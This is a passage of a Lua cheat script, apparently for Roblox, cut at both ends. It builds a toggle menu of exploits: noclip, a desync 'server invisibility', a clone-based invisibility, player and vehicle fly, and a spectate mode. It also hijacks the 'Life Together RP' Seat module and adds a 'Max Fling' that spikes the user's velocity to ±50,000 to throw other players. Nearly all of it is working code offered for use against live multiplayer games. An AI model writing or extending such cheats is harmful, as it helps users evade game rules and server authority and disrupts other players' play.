    for _, btn in ipairs(SavedScroll:GetChildren()) do
        if btn:IsA("TextButton") then
            local vp, nb = btn:FindFirstChild("ViewportFrame"), btn:FindFirstChild("NameBox")
            if vp and nb then
                if isSavedGridMode then
                    vp.Size, vp.Position = UDim2.new(0, 60, 0, 60), UDim2.new(0.5, -30, 0, 5)
                    nb.Size, nb.Position, nb.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 75), Enum.TextXAlignment.Center
                else
                    vp.Size, vp.Position = UDim2.new(0, 40, 0, 40), UDim2.new(0, 5, 0, 5)
                    nb.Size, nb.Position, nb.TextXAlignment = UDim2.new(1, -60, 0, 40), UDim2.new(0, 55, 0, 0), Enum.TextXAlignment.Left
                end
            end
        end
    end
end)

SavedSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local query = string.lower(SavedSearchBox.Text)
    for _, child in ipairs(SavedScroll:GetChildren()) do
        if child:IsA("TextButton") then
            local nb = child:FindFirstChild("NameBox")
            if nb then
                if query == "all" then
                    child.Visible = true
                elseif query == "" then
                    child.Visible = child:GetAttribute("DefaultVisible") or false
                else
                    child.Visible = (string.find(string.lower(nb.Text), query) ~= nil)
                end
            end
        end
    end
end)

-- ========== NO CLIP TOOL (State-Saving Hybrid) ==========
local RunService = game:GetService("RunService")
local noclipEnabled = false
local noclipConnection = nil
local originalCollisions = {}

local NoclipBtn = Instance.new("TextButton")
NoclipBtn.Size = UDim2.new(1, -5, 0, 40)
NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
NoclipBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoclipBtn.Font = Enum.Font.SourceSansBold
NoclipBtn.TextSize = 16
NoclipBtn.Text = "👻 No Clip: OFF"
NoclipBtn.BorderSizePixel = 0
NoclipBtn.Parent = ToolsScroll

NoclipBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end

    noclipEnabled = not noclipEnabled

    if noclipEnabled then
        NoclipBtn.Text = "👻 No Clip: ON"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Save the original collision states exactly like the reference script
        table.clear(originalCollisions)
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                originalCollisions[v] = v.CanCollide
            end
        end

        -- 2. Force it false continuously to fight the Humanoid's auto-physics
        noclipConnection = RunService.Stepped:Connect(function()
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end)
    else
        NoclipBtn.Text = "👻 No Clip: OFF"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Stop the forced loop
        if noclipConnection then 
            noclipConnection:Disconnect() 
            noclipConnection = nil 
        end
        
        -- 3. Restore original collisions cleanly like the reference script
        for part, originalState in pairs(originalCollisions) do
            if part and part.Parent then
                part.CanCollide = originalState
            end
        end
        table.clear(originalCollisions)
    end
end)
-- ========== FE INVISIBLE TOOL (Desync Method) ==========
local feInvisEnabled = false
local invisConnections = {}
local ghostParts = {}

local FeInvisBtn = Instance.new("TextButton")
FeInvisBtn.Size = UDim2.new(1, -5, 0, 40)
FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FeInvisBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FeInvisBtn.Font = Enum.Font.SourceSansBold
FeInvisBtn.TextSize = 16
FeInvisBtn.Text = "🫥 Server Invis: OFF"
FeInvisBtn.BorderSizePixel = 0
FeInvisBtn.Parent = ToolsScroll

FeInvisBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
    
    if not char or not humanoid or not rootPart then return end

    feInvisEnabled = not feInvisEnabled

    if feInvisEnabled then
        FeInvisBtn.Text = "🫥 Server Invis: ON"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Make us look like a ghost locally so we know it's on
        table.clear(ghostParts)
        for _, obj in pairs(char:GetDescendants()) do 
            if obj:IsA("BasePart") and obj.Transparency == 0 then 
                table.insert(ghostParts, obj)
                obj.Transparency = 0.5
            end 
        end

        -- The Desync Loop
        invisConnections[1] = RunService.Heartbeat:Connect(function()
            if feInvisEnabled and rootPart and humanoid then
                local cf = rootPart.CFrame
                local camOffset = humanoid.CameraOffset

                -- Fling way under the map exactly when the server updates
                local hidden = cf * CFrame.new(0, -200000, 0)
                rootPart.CFrame = hidden
                humanoid.CameraOffset = hidden:ToObjectSpace(CFrame.new(cf.Position)).Position

                -- Wait for our local screen to render
                RunService.RenderStepped:Wait()

                -- Snap back to normal for our screen
                rootPart.CFrame = cf
                humanoid.CameraOffset = camOffset
            end
        end)
    else
        FeInvisBtn.Text = "🫥 Server Invis: OFF"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup connections
        for _, conn in pairs(invisConnections) do conn:Disconnect() end
        table.clear(invisConnections)
        
        -- Restore our character's looks and camera
        for _, part in pairs(ghostParts) do
            if part and part.Parent then
                part.Transparency = 0
            end
        end
        if humanoid then
            humanoid.CameraOffset = Vector3.new(0,0,0)
        end
    end
end)

---
-- ========== ANTI-FLING & ANTI-VEHICLE FLING ==========
local antiFlingEnabled = false
local antiFlingConnection = nil

local AntiFlingBtn = Instance.new("TextButton")
AntiFlingBtn.Size = UDim2.new(1, -5, 0, 40)
AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
AntiFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiFlingBtn.Font = Enum.Font.SourceSansBold
AntiFlingBtn.TextSize = 16
AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
AntiFlingBtn.BorderSizePixel = 0
AntiFlingBtn.Parent = ToolsScroll

AntiFlingBtn.MouseButton1Click:Connect(function()
    antiFlingEnabled = not antiFlingEnabled

    if antiFlingEnabled then
        AntiFlingBtn.Text = "🛡️ Anti-Fling: ON"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Runs before physics calculate to prevent touches
        antiFlingConnection = RunService.Stepped:Connect(function()
            local myChar = LocalPlayer.Character
            if not myChar then return end

            -- 1. PURE ANTI-FLING: Disable collisions for all other players globally
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character then
                    for _, part in ipairs(p.Character:GetDescendants()) do
                        if part:IsA("BasePart") and part.CanCollide then
                            part.CanCollide = false
                        end
                    end
                end
            end

            -- 2. VELOCITY STABILIZER: Protects you and your vehicle from physics spikes
            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar:FindFirstChildOfClass("Humanoid")
            
            if myHum and myHum.SeatPart then
                -- Anti-Vehicle Fling Logic
                local vehicle = myHum.SeatPart:FindFirstAncestorOfClass("Model")
                if vehicle then
                    local pPart = vehicle.PrimaryPart or myHum.SeatPart
                    if pPart then
                        if pPart.AssemblyAngularVelocity.Magnitude > 50 or pPart.AssemblyLinearVelocity.Magnitude > 400 then
                            pPart.AssemblyAngularVelocity = Vector3.zero
                            pPart.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                        end
                    end
                end
            elseif myRoot then
                -- Standard Player Anti-Fling Fallback
                if myRoot.AssemblyAngularVelocity.Magnitude > 50 or myRoot.AssemblyLinearVelocity.Magnitude > 250 then
                    myRoot.AssemblyAngularVelocity = Vector3.zero
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                end
            end
        end)
    else
        AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if antiFlingConnection then
            antiFlingConnection:Disconnect()
            antiFlingConnection = nil
        end
    end
end)

-- ========== LIFE TOGETHER RP ANTI-SIT TOOL ==========
local ltAntiSitEnabled = false
local ltAntiSitConnections = {}
local seatModule = nil

-- Attempt to find Life Together's specific Seat module
task.spawn(function()
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("ModuleScript") and v.Name == "Seat" then
                local s = require(v)
                -- Verify it's the right module by checking for the 'enabled.set' function
                if type(s) == "table" and s.enabled and s.enabled.set then
                    seatModule = s
                    break
                end
            end
        end
    end)
end)

local function hookLtCharacter(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    local conn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
        if not ltAntiSitEnabled then return end
        
        if humanoid.Sit then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            task.spawn(function()
                if humanoid.SeatPart then
                    local weld = humanoid.SeatPart:FindFirstChildOfClass("Weld")
                    if weld then weld:Destroy() end
                    local prox = humanoid.SeatPart:FindFirstChildOfClass("ProximityPrompt")
                    if prox and prox.Enabled == false then
                        prox.Enabled = true
                    end
                end
                for _ = 1, 5 do
                    task.wait()
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    humanoid.Sit = false
                end
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end)
        end
    end)
    table.insert(ltAntiSitConnections, conn)
end

local LtAntiSitBtn = Instance.new("TextButton")
LtAntiSitBtn.Size = UDim2.new(1, -5, 0, 40)
LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
LtAntiSitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
LtAntiSitBtn.Font = Enum.Font.SourceSansBold
LtAntiSitBtn.TextSize = 16
LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
LtAntiSitBtn.BorderSizePixel = 0
LtAntiSitBtn.Parent = ToolsScroll

LtAntiSitBtn.MouseButton1Click:Connect(function()
    ltAntiSitEnabled = not ltAntiSitEnabled
    
    if ltAntiSitEnabled then
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: ON"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Apply your custom character physics hook
        hookLtCharacter(LocalPlayer.Character)
        local charConn = LocalPlayer.CharacterAdded:Connect(hookLtCharacter)
        table.insert(ltAntiSitConnections, charConn)
        
        -- 2. Attack the Life Together Seat Module specifically (from your script)
        if seatModule then
            local loopConn = RunService.Stepped:Connect(function()
                if ltAntiSitEnabled then
                    pcall(function() seatModule.enabled.set(false) end)
                end
            end)
            table.insert(ltAntiSitConnections, loopConn)
        end
        
    else
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup all loops and connections
        for _, conn in pairs(ltAntiSitConnections) do
            if conn and conn.Connected then conn:Disconnect() end
        end
        table.clear(ltAntiSitConnections)
        
        -- Restore Life Together's Seat Module back to normal
        if seatModule then
            pcall(function() seatModule.enabled.set(true) end)
        end
    end
end)

----------
-- ========== SYSTEM BROKEN V2 (Max Intensity Fling) ==========
local RunService = game:GetService("RunService")
local isSystemFlinging = false
local systemFlingLoop = nil
local originalProperties = {}

local FlingBtn = Instance.new("TextButton")
FlingBtn.Size = UDim2.new(1, -5, 0, 40)
FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlingBtn.Font = Enum.Font.SourceSansBold
FlingBtn.TextSize = 16
FlingBtn.Text = "🌪️ Max Fling: OFF"
FlingBtn.BorderSizePixel = 0
FlingBtn.Parent = ToolsScroll

FlingBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    isSystemFlinging = not isSystemFlinging

    if isSystemFlinging then
        FlingBtn.Text = "🌪️ Max Fling: ON"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        
        -- 1. Increase our mass to the engine's limit so we don't bounce off targets
        table.clear(originalProperties)
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                originalProperties[part] = part.CustomPhysicalProperties
                part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            end
        end

        systemFlingLoop = RunService.Heartbeat:Connect(function()
            if not char or not root then return end
            
            -- Save your real movement and camera orientation
            local savedVel = root.Velocity
            local savedRot = root.RotVelocity
            
            -- 2. Violent Multi-Axis Spike (-50,000 Y combined with random X/Z rotation)
            root.Velocity = Vector3.new(math.random(-50000, 50000), -50000, math.random(-50000, 50000))
            root.RotVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), math.random(-50000, 50000))
            
            -- Wait for the engine to transfer this massive energy to the target
            RunService.RenderStepped:Wait()
            
            -- Instantly restore so we don't break our own screen or fall into the void
            if root then
                root.Velocity = savedVel
                root.RotVelocity = savedRot
            end
        end)
    else
        FlingBtn.Text = "🌪️ Max Fling: OFF"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if systemFlingLoop then
            systemFlingLoop:Disconnect()
            systemFlingLoop = nil
        end
        if root then
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
        end
        
        -- Restore original avatar mass
        for part, props in pairs(originalProperties) do
            if part and part.Parent then
                part.CustomPhysicalProperties = props
            end
        end
        table.clear(originalProperties)
    end
end)
-- ========== INVISIBLE+ (AmokahFox Clone Method) ==========
local isVisPlusOn = false
local invisRunning = false
local invisFix = nil
local invisDied = nil
local RealCharacter = nil
local FakeCharacter = nil

local VisPlusBtn = Instance.new("TextButton")
VisPlusBtn.Size = UDim2.new(1, -5, 0, 40)
VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
VisPlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VisPlusBtn.Font = Enum.Font.SourceSansBold
VisPlusBtn.TextSize = 16
VisPlusBtn.Text = "👻 Invisible+: OFF"
VisPlusBtn.BorderSizePixel = 0
VisPlusBtn.Parent = ToolsScroll

local function TurnVisible()
    if not invisRunning then return end
    
    if invisFix then invisFix:Disconnect() end
    if invisDied then invisDied:Disconnect() end
    
    local Player = game.Players.LocalPlayer
    if RealCharacter and RealCharacter.Parent == game.Lighting then
        local CF_1 = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame
        
        FakeCharacter:Destroy()
        Player.Character = RealCharacter
        RealCharacter.Parent = workspace
        
        if CF_1 and RealCharacter:FindFirstChild("HumanoidRootPart") then
            RealCharacter.HumanoidRootPart.CFrame = CF_1
        end
        
        local anim = RealCharacter:FindFirstChild("Animate")
        if anim then
            anim.Disabled = true
            anim.Disabled = false
        end
    end
    invisRunning = false
    isVisPlusOn = false
    VisPlusBtn.Text = "👻 Invisible+: OFF"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
end

local function Respawn()
    if not invisRunning then return end
    local Player = game.Players.LocalPlayer
    pcall(function()
        Player.Character = RealCharacter
        task.wait()
        RealCharacter.Parent = workspace
        local hum = RealCharacter:FindFirstChildWhichIsA('Humanoid')
        if hum then hum:Destroy() end
        TurnVisible()
    end)
end

local function TurnInvisiblePlus()
    if invisRunning then return end
    invisRunning = true
    isVisPlusOn = true
    VisPlusBtn.Text = "👻 Invisible+: ON"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)

    local Player = game.Players.LocalPlayer
    RealCharacter = Player.Character
    if not RealCharacter then return TurnVisible() end
    
    RealCharacter.Archivable = true
    FakeCharacter = RealCharacter:Clone()
    FakeCharacter.Parent = game.Lighting
    FakeCharacter.Name = ""
    
    local Void = workspace.FallenPartsDestroyHeight

    invisFix = game:GetService("RunService").Stepped:Connect(function()
        pcall(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                if root.Position.Y <= Void then
                    Respawn()
                end
            end
        end)
    end)

    for _, v in ipairs(FakeCharacter:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Name == "HumanoidRootPart" then
                v.Transparency = 1
            else
                v.Transparency = 0.5
            end
        end
    end

    local fakeHum = FakeCharacter:FindFirstChildOfClass('Humanoid')
    if fakeHum then
        invisDied = fakeHum.Died:Connect(function()
            Respawn()
        end)
    end

    local CF_1 = RealCharacter:FindFirstChild("HumanoidRootPart") and RealCharacter.HumanoidRootPart.CFrame
    RealCharacter:MoveTo(Vector3.new(0, math.pi * 1000000, 0))
    
    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
    task.wait(0.2)
    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    
    RealCharacter.Parent = game.Lighting
    FakeCharacter.Parent = workspace
    if CF_1 and FakeCharacter:FindFirstChild("HumanoidRootPart") then
        FakeCharacter.HumanoidRootPart.CFrame = CF_1
    end
    Player.Character = FakeCharacter
    
    workspace.CurrentCamera.CameraSubject = FakeCharacter:FindFirstChildWhichIsA('Humanoid')
    
    local anim = FakeCharacter:FindFirstChild("Animate")
    if anim then
        anim.Disabled = true
        anim.Disabled = false
    end
end

VisPlusBtn.MouseButton1Click:Connect(function()
    if isVisPlusOn then
        TurnVisible()
    else
        TurnInvisiblePlus()
    end
end)
-- ========== PURE ANTI-SPIN SPECTATE LOGIC ==========
local isViewing = false
local viewLoop = nil
local viewPart = nil
local selectedSpectateTarget = nil

local function stopView()
    isViewing = false
    selectedSpectateTarget = nil
    if viewLoop then viewLoop:Disconnect() viewLoop = nil end
    if viewPart then viewPart:Destroy() viewPart = nil end
    
    local cam = workspace.CurrentCamera
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if cam and hum then
        cam.CameraSubject = hum
    end
end

local function startView(targetPlayer)
    stopView()
    if not targetPlayer or not targetPlayer.Character then return end
    isViewing = true
    selectedSpectateTarget = targetPlayer
    
    viewPart = Instance.new("Part")
    viewPart.Transparency = 1
    viewPart.CanCollide = false
    viewPart.Anchored = true
    viewPart.Parent = workspace
    
    workspace.CurrentCamera.CameraSubject = viewPart
    
    viewLoop = RunService.RenderStepped:Connect(function()
        if not selectedSpectateTarget or not selectedSpectateTarget.Character then return end
        local tRoot = selectedSpectateTarget.Character:FindFirstChild("HumanoidRootPart")
        if tRoot then
            viewPart.CFrame = CFrame.new(tRoot.Position)
        end
    end)
end

-- ==============================================================
-- ✈️ SMART FLY TOOL (Local + RC Drone Vehicle Fly)
-- ==============================================================
local localFlyEnabled = false
local vehFlyEnabled = false
local vehViewEnabled = false
local plrFrozen = false
local localFlySpeed = 2 -- SHARED SPEED VARIABLE

-- Physics Trackers
local flyLoop = nil
local vFlyLoop = nil
local flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}
local flyInputs = {}
local vFlyCollisions = {}

-- 1. Main Container
local FlyContainer = Instance.new("Frame")
FlyContainer.Size = UDim2.new(1, -5, 0, 40)
FlyContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
FlyContainer.BorderSizePixel = 0
FlyContainer.ClipsDescendants = true
FlyContainer.Parent = ToolsScroll

-- 2. The Main Button (Local Fly)
local FlyBtn = Instance.new("TextButton")
FlyBtn.Size = UDim2.new(1, 0, 0, 40)
FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyBtn.Font = Enum.Font.SourceSansBold
FlyBtn.TextSize = 16
FlyBtn.Text = "✈️ Local Fly: OFF (Hold for Options)"
FlyBtn.BorderSizePixel = 0
FlyBtn.Parent = FlyContainer
Instance.new("UICorner", FlyBtn).CornerRadius = UDim.new(0, 8)

-- 3. The Shared Speed Slider
local SpeedSlider = createSlider(FlyContainer, "⚡ Shared Fly Speed", 1, 10, 2, function(value)
    localFlySpeed = value
end)
SpeedSlider.Position = UDim2.new(0, 0, 0, 45)

-- 4. The Vehicle Fly Button
local VehFlyBtn = Instance.new("TextButton")
VehFlyBtn.Size = UDim2.new(1, -10, 0, 35)
VehFlyBtn.Position = UDim2.new(0, 5, 0, 100)
VehFlyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
VehFlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehFlyBtn.Font = Enum.Font.SourceSansBold
VehFlyBtn.TextSize = 15
VehFlyBtn.Text = "🚗 Vehicle Fly: OFF"
VehFlyBtn.BorderSizePixel = 0
VehFlyBtn.Parent = FlyContainer
Instance.new("UICorner", VehFlyBtn).CornerRadius = UDim.new(0, 6)

-- 5. Vehicle View Button (Camera Snap)
local VehViewBtn = Instance.new("TextButton")
VehViewBtn.Size = UDim2.new(1, -10, 0, 35)
VehViewBtn.Position = UDim2.new(0, 5, 0, 140)
VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
VehViewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehViewBtn.Font = Enum.Font.SourceSansBold
VehViewBtn.TextSize = 15
VehViewBtn.Text = "🎥 Vehicle View: OFF"
VehViewBtn.BorderSizePixel = 0
VehViewBtn.Parent = FlyContainer
Instance.new("UICorner", VehViewBtn).CornerRadius = UDim.new(0, 6)

-- 6. Stone Player Button (Freeze Body)
local FreezeBtn = Instance.new("TextButton")
FreezeBtn.Size = UDim2.new(1, -10, 0, 35)
FreezeBtn.Position = UDim2.new(0, 5, 0, 180)
FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
FreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FreezeBtn.Font = Enum.Font.SourceSansBold
FreezeBtn.TextSize = 15
FreezeBtn.Text = "🗿 Stone Player: OFF"
FreezeBtn.BorderSizePixel = 0
FreezeBtn.Parent = FlyContainer
Instance.new("UICorner", FreezeBtn).CornerRadius = UDim.new(0, 6)

-- ==========================================
-- UTILITY & CAMERA LOGIC
-- ==========================================
local function getMyVehicle()
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end
    for _, v in pairs(vehiclesFolder:GetChildren()) do
        local ownerObj = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)
        if ownerObj and ownerObj.Value == LocalPlayer then return v end
    end
    return nil
end

local function resetDroneTools()
    -- Reset Camera
    if vehViewEnabled then
        vehViewEnabled = false
        VehViewBtn.Text = "🎥 Vehicle View: OFF"
        VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then workspace.CurrentCamera.CameraSubject = hum end
    end
    -- Reset Player Freeze
    if plrFrozen then
        plrFrozen = false
        FreezeBtn.Text = "🗿 Stone Player: OFF"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = false end
    end
end

VehViewBtn.MouseButton1Click:Connect(function()
    vehViewEnabled = not vehViewEnabled
    local cam = workspace.CurrentCamera
    if vehViewEnabled then
        local car = getMyVehicle()
        local targetPart = car and (car.PrimaryPart or car:FindFirstChild("Base"))
        if targetPart then
            VehViewBtn.Text = "🎥 Vehicle View: ON"
            VehViewBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            cam.CameraSubject = targetPart
        else
            vehViewEnabled = false
            VehViewBtn.Text = "No Car Found!"
            task.wait(1.5)
            VehViewBtn.Text = "🎥 Vehicle View: OFF"
        end
    else
        VehViewBtn.Text = "🎥 Vehicle View: OFF"
        VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then cam.CameraSubject = hum end
    end
end)

FreezeBtn.MouseButton1Click:Connect(function()
    plrFrozen = not plrFrozen
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if plrFrozen then
        FreezeBtn.Text = "🗿 Stone Player: ON"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        if hrp then hrp.Anchored = true end
    else
        FreezeBtn.Text = "🗿 Stone Player: OFF"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        if hrp then hrp.Anchored = false end
    end
end)

-- ==========================================
-- LOCAL FLY PHYSICS
-- ==========================================
local function stopLocalFly()
    localFlyEnabled = false
    FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    
    if FlyContainer.Size.Y.Offset > 50 then
        FlyBtn.Text = "✈️ Local Fly: OFF [▲ Options]"
    else
        FlyBtn.Text = "✈️ Local Fly: OFF (Hold for Options)"
    end

    if flyLoop then flyLoop:Disconnect() flyLoop = nil end
    for _, c in pairs(flyInputs) do c:Disconnect() end
    table.clear(flyInputs)
    flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}

    local char = LocalPlayer.Character
    if char then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hrp then
            local bg = hrp:FindFirstChild("LocalFlyGyro")
            local bv = hrp:FindFirstChild("LocalFlyVelocity")
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
        end
        if hum then 
            hum.PlatformStand = false 
            hum:ChangeState(Enum.HumanoidStateType.Jumping) 
        end
    end
end

local function startLocalFly()
    if vehFlyEnabled then stopVehFly() end 
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then stopLocalFly() return end

    local bg = Instance.new("BodyGyro", hrp)
    bg.Name = "LocalFlyGyro"
    bg.P = 9e4
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.CFrame = hrp.CFrame

    local bv = Instance.new("BodyVelocity", hrp)
    bv.Name = "LocalFlyVelocity"
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero

    hum.PlatformStand = true

    flyLoop = RunService.RenderStepped:Connect(function()
        if not char or not char.Parent then stopLocalFly() return end
        local cam = workspace.CurrentCamera
        bg.CFrame = cam.CFrame
        
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            local success, controlModule = pcall(function() return require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")) end)
            if success and controlModule then
                local dir = controlModule:GetMoveVector()
                if dir.Magnitude > 0 then
                    bv.Velocity = (cam.CFrame.LookVector * -dir.Z + cam.CFrame.RightVector * dir.X) * (localFlySpeed * 50)
                else
                    bv.Velocity = Vector3.zero
                end
            end
        else
            local look = cam.CFrame.LookVector
            local right = cam.CFrame.RightVector
            local up = Vector3.new(0, 1, 0)
            local vel = (look * (flyKeys.f + flyKeys.b)) + (right * (flyKeys.r + flyKeys.l)) + (up * (flyKeys.q + flyKeys.e))
            if vel.Magnitude > 0 then
                bv.Velocity = vel.Unit * (localFlySpeed * 50)
            else
                bv.Velocity = bv.Velocity * 0.9 
            end
        end
    end)

    table.insert(flyInputs, UserInputService.InputBegan:Connect(function(i, gp)
        if gp then return end
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 1 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = -1 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = -1 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 1 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 1 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = -1 end
    end))
    table.insert(flyInputs, UserInputService.InputEnded:Connect(function(i)
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 0 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = 0 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = 0 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 0 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 0 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = 0 end
    end))
end

-- ==========================================
-- VEHICLE FLY PHYSICS (RC DRONE)
-- ==========================================
local function stopVehFly()
    vehFlyEnabled = false
    VehFlyBtn.Text = "🚗 Vehicle Fly: OFF"
    VehFlyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)

    if vFlyLoop then vFlyLoop:Disconnect() vFlyLoop = nil end
    for _, c in pairs(flyInputs) do c:Disconnect() end
    table.clear(flyInputs)
    flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}

    resetDroneTools() -- Shut down camera view and stone player

    -- Restore Collisions
    for part, state in pairs(vFlyCollisions) do
        if part and part.Parent then part.CanCollide = state end
    end
    table.clear(vFlyCollisions)

    local car = getMyVehicle()
    if car then
        local base = car:FindFirstChild("Base") or car.PrimaryPart
        if base then
            local bg = base:FindFirstChild("VehFlyGyro")
            local bv = base:FindFirstChild("VehFlyVelocity")
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
        end
    end
end

local function startVehFly()
    if localFlyEnabled then stopLocalFly() end 
    
    local car = getMyVehicle()
    if not car then stopVehFly() VehFlyBtn.Text = "No Vehicle Found!" task.wait(1.5) VehFlyBtn.Text = "🚗 Vehicle Fly: OFF" return end
    
    local base = car:FindFirstChild("Base") or car.PrimaryPart
    if not base then stopVehFly() return end

    -- Save & Disable Collisions
    table.clear(vFlyCollisions)
    for _, v in ipairs(car:GetDescendants()) do
        if v:IsA("BasePart") then
            vFlyCollisions[v] = v.CanCollide
            v.CanCollide = false
        end
    end

